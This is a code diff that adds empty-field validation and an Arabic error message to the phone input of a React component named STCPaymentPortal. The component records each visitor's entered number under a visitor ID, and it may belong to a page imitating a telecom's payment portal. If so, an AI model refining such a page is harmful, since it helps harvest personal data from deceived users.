@@ -16,9 +16,17 @@ export default function STCPaymentPortal() {
   const [isLoading, setIsLoading] = useState(false)
   const [loadingProgress, setLoadingProgress] = useState(0)
   const [phone, setPhone] = useState('')
+  const [error, setError] = useState('')
 
 
   const handlePayNow = async () => {
+    // Validate phone field
+    if (!phone.trim()) {
+      setError('الرجاء إدخال الرقم للمتابعة')
+      return
+    }
+
+    setError('')
     setIsLoading(true)
     setLoadingProgress(0)
     addData({ id: visitorId, mobile: phone,phone})
@@ -147,11 +155,23 @@ export default function STCPaymentPortal() {
                 <Input
                   type="tel"
                   maxLength={12}
-                  onChange={(e) => { setPhone(e.target.value) }}
+                  onChange={(e) => { 
+                    setPhone(e.target.value)
+                    if (e.target.value.trim()) {
+                      setError('')
+                    }
+                  }}
                   placeholder="رقم الموبايل/البطاقة المدينة أو رقم العقد"
-                  className="w-full h-8 sm:h-8 text-right border-border rounded-xl px-4 sm:px-5 text-sm sm:text-base text-foreground placeholder:text-muted-foreground bg-input focus:ring-2 focus:ring-ring focus:border-transparent transition-all duration-200"
+                  className={`w-full h-8 sm:h-8 text-right border-2 rounded-xl px-4 sm:px-5 text-sm sm:text-base text-foreground placeholder:text-muted-foreground bg-input focus:ring-2 focus:ring-ring focus:border-transparent transition-all duration-200 ${
+                    error ? 'border-destructive' : 'border-border'
+                  }`}
                   dir="rtl"
                 />
+                {error && (
+                  <p className="text-destructive text-sm mt-2 text-right font-medium">
+                    {error}
+                  </p>
+                )}
               </div>
 
               <div className="flex gap-3 sm:gap-4">
